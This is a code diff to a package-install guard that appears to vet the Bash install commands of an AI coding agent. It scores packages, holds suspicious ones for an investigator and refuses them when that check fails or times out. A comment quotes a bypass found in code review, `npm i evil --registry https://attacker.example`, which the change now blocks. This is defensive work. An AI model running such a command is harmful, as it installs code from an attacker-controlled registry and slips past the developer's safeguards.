@@ -25,7 +25,7 @@ import {
 import { cacheGet, cacheSet } from './cache'
 import { gatherFacts } from './facts'
 import type { EnvPort, ReadFilePort, SourceIo } from './ports'
-import { loadPrivateConfig } from './project-config'
+import { isPublicRegistry, loadPrivateConfig } from './project-config'
 
 export type TripwireIo = SourceIo & {
   readFile: ReadFilePort
@@ -80,28 +80,44 @@ const completeRequest = async (io: TripwireIo, request: InstallRequest): Promise
   return expandRequest(request, files)
 }
 
-const investigationOutcome = (ref: PackageRef, inv: Investigation, now: number): PackageCheck | undefined => {
-  const base = { ref, decidedAt: now, expiresAt: now + VERDICT_TTL_MS }
+/** A Sentinel past its deadline has timed out, whether or not its turn ever ended (FR-017). */
+const current = (inv: Investigation | undefined, now: number): Investigation | undefined =>
+  inv && (inv.status === 'queued' || inv.status === 'running') && now > inv.deadline
+    ? { ...inv, status: 'timedOut', failure: inv.failure ?? `no verdict within ${Math.round((inv.deadline - inv.startedAt) / 1000)} s` }
+    : inv
+
+/**
+ * What an investigation does to a package that fast-scored as held. Investigations only ever
+ * resolve holds (FR-015): a package with a hard signal scores refuse and never gets here, so a
+ * Sentinel "allow" can't clear it, however the investigation came about (code review, 2026-10-13).
+ */
+const resolveHold = (held: PackageCheck, inv: Investigation | undefined, now: number): { check: PackageCheck; dispatch: boolean } => {
+  if (!inv) return { check: held, dispatch: true }
+  if (inv.status === 'queued' || inv.status === 'running') return { check: held, dispatch: false }
+  const base = { ref: held.ref, decidedAt: now, expiresAt: now + VERDICT_TTL_MS, decidedBy: 'sentinel' as const }
   if (inv.status === 'concluded' && inv.verdict) {
     const allowed = inv.verdict.verdict === 'allow' && !inv.hasHardSignal
     const signals: Signal[] = inv.verdict.evidence.map(e => ({ kind: 'malware', state: allowed ? 'absent' : 'present', weight: 'hard', evidence: e }))
-    return { ...base, tier: allowed ? 'pass' : 'refuse', signals, decidedBy: 'sentinel' }
+    return { check: { ...base, tier: allowed ? 'pass' : 'refuse', signals }, dispatch: false }
   }
-  return undefined
+  // failed or timed out: fail closed; textFor picks the investigation-failed wording
+  return { check: { ...base, tier: 'refuse', signals: [] }, dispatch: false }
 }
 
 const textFor = (check: PackageCheck, investigations: Record<string, Investigation>, now: number): string => {
-  const stored = investigations[key(check.ref)]
-  const inv = stored && (stored.status === 'queued' || stored.status === 'running') && now > stored.deadline
-    ? { ...stored, status: 'timedOut' as const, failure: stored.failure ?? `no verdict within ${Math.round((stored.deadline - stored.startedAt) / 1000)} s` }
-    : stored
-  if (inv && (inv.status === 'failed' || inv.status === 'timedOut')) {
+  const inv = current(investigations[key(check.ref)], now)
+  if (check.decidedBy === 'override') return blockedText(check.ref)
+  if (check.decidedBy === 'sentinel' && inv && (inv.status === 'failed' || inv.status === 'timedOut')) {
     return investigationFailedText(check.ref, inv.status === 'failed' ? 'failed' : 'timed out', inv.failure ?? 'no verdict')
   }
-  if (check.decidedBy === 'override') return blockedText(check.ref)
   if (check.decidedBy === 'sentinel') return sentinelRefusedText(check.ref, check.signals.map(s => s.evidence))
   return check.tier === 'hold' ? heldText(check) : refusedText(check)
 }
+
+// An exact version (1.2.3, 2.0.0-rc.1), as opposed to a range or tag: only exact versions have a
+// fixed verdict worth caching up front. `latest` moves, so it is always re-scored (code review)
+const EXACT = /^v?\d+(\.\d+)*([-+][0-9A-Za-z.-]+)?$/
+const isExact = (ref: PackageRef): boolean => ref.version !== undefined && EXACT.test(ref.version)
 
 /** Evaluates one Bash command. Never throws for expected failures: unknowns stay unknown. */
 export const evaluate = async (
@@ -124,19 +140,22 @@ export const evaluate = async (
     return { kind: 'allow', requests, checks: [], toInvestigate: [], text: '', unchecked }
   }
 
-  const indexUrls: Partial<Record<Ecosystem, string[]>> = {}
-  for (const r of requests) {
-    const eco = ecosystemOf(r)
-    if (eco && r.indexUrls?.length) indexUrls[eco] = [...(indexUrls[eco] ?? []), ...r.indexUrls]
+  // Registries named on the command line are the agent's choice, not the developer's config, so
+  // they are never trusted as private: a package fetched from one is refused unless overridden
+  // (code review, 2026-10-13: `npm i evil --registry https://attacker.example` used to pass)
+  const commandLineRegistry = new Map<string, string>()
+  for (const { request, ref } of pending) {
+    const url = request.indexUrls?.find(u => !isPublicRegistry(ref.ecosystem, u))
+    if (url) commandLineRegistry.set(key(ref), url)
   }
   const [config, overrides, investigations] = await Promise.all([
-    loadPrivateConfig({ readFile: io.readFile, env: io.env, cwd: io.cwd, allowlist: options.allowlist.join(','), indexUrls }),
+    loadPrivateConfig({ readFile: io.readFile, env: io.env, cwd: io.cwd, allowlist: options.allowlist.join(',') }),
     io.overrides(),
     io.investigations(),
   ])
   const popular = options.popular ?? popularIndexes()
 
-  // Overrides, Sentinel verdicts and cached fast-score verdicts settle a package without fetching
+  // Overrides and cached verdicts for exact versions settle a package without fetching
   const settled = new Map<string, PackageCheck>()
   const toFetch: PackageRef[] = []
   for (const { ref } of pending) {
@@ -147,34 +166,31 @@ export const evaluate = async (
       settled.set(k, decide({ ref, signals: [], now, override, mode: options.mode }))
       continue
     }
-    const stored = investigations[k]
-    // A Sentinel past its deadline has timed out, whether or not its turn ever ended (FR-017)
-    const inv = stored && (stored.status === 'queued' || stored.status === 'running') && now > stored.deadline
-      ? { ...stored, status: 'timedOut' as const, failure: stored.failure ?? `no verdict within ${Math.round((stored.deadline - stored.startedAt) / 1000)} s` }
-      : stored
-    if (inv) {
-      const done = investigationOutcome(ref, inv, now)
-      if (done) { settled.set(k, done); continue }
-      if (inv.status === 'queued' || inv.status === 'running') {
-        settled.set(k, { ref, tier: 'hold', signals: inv.reasons.map(e => ({ kind: 'packageAge', state: 'present', weight: 'strong', evidence: e })), decidedBy: 'fast-score', decidedAt: now, expiresAt: now })
-        continue
-      }
-      // failed or timed out: fail closed (FR-017); textFor picks the investigation-failed wording
-      settled.set(k, { ref, tier: 'refuse', signals: [], decidedBy: 'sentinel', decidedAt: now, expiresAt: now })
-      continue
+    if (isExact(ref) && !commandLineRegistry.has(k)) {
+      const cached = await cacheGet<PackageCheck>(io, 'verdict', k)
+      if (cached) { settled.set(k, { ...cached, decidedBy: 'cache' }); continue }
     }
-    const cached = await cacheGet<PackageCheck>(io, 'verdict', k)
-    if (cached) { settled.set(k, { ...cached, decidedBy: 'cache' }); continue }
     toFetch.push(ref)
   }
 
   const facts = toFetch.length ? await gatherFacts(io, toFetch, config) : []
   const toInvestigate: PackageCheck[] = []
-  for (const f of facts) {
-    const check = scorePackage(f, now, popular[f.ref.ecosystem], { mode: options.mode })
-    settled.set(key(f.ref), check)
-    if (check.tier === 'pass' || check.tier === 'refuse') await cacheSet(io, 'verdict', key(f.ref), check, VERDICT_TTL_MS)
-    if (check.tier === 'hold') toInvestigate.push(check)
+  for (const raw of facts) {
+    const k = key(raw.ref)
+    const registry = commandLineRegistry.get(k)
+    const f = registry ? { ...raw, commandLineRegistry: registry } : raw
+    let check = scorePackage(f, now, popular[f.ref.ecosystem], { mode: options.mode })
+    if (check.tier === 'hold') {
+      const r = resolveHold(check, current(investigations[k], now), now)
+      check = r.check
+      if (r.dispatch) toInvestigate.push(check)
+    }
+    settled.set(k, check)
+    if ((check.tier === 'pass' || check.tier === 'refuse') && check.decidedBy !== 'sentinel' && !registry) {
+      // Cached under the version that resolved, so an exact request for it is instant next time
+      const resolved = f.resolvedVersion !== 'unknown' && !isExact(f.ref) ? { ...f.ref, version: f.resolvedVersion } : f.ref
+      if (isExact(resolved)) await cacheSet(io, 'verdict', key(resolved), { ...check, ref: resolved }, VERDICT_TTL_MS)
+    }
   }
 
   const checks = pending.map(({ request, ref }) => ({ request, check: settled.get(key(ref))! }))
@@ -193,8 +209,9 @@ export const evaluate = async (
     const span = request.spans?.[key(check.ref)]
     if (!span) {
       const { pinnedTo: _to, pinnedFrom: _from, ...rest } = check
-      entry.check = { ...rest, tier: 'hold', decidedBy: 'fast-score' }
-      if (!toInvestigate.some(c => key(c.ref) === key(check.ref))) toInvestigate.push(entry.check)
+      const r = resolveHold({ ...rest, tier: 'hold', decidedBy: 'fast-score' }, current(investigations[key(check.ref)], now), now)
+      entry.check = r.check
+      if (r.dispatch && !toInvestigate.some(c => key(c.ref) === key(check.ref))) toInvestigate.push(r.check)
       continue
     }
     replacements.push({ span, text: pinnedToken(check.ref, check.pinnedTo, request.tool) })
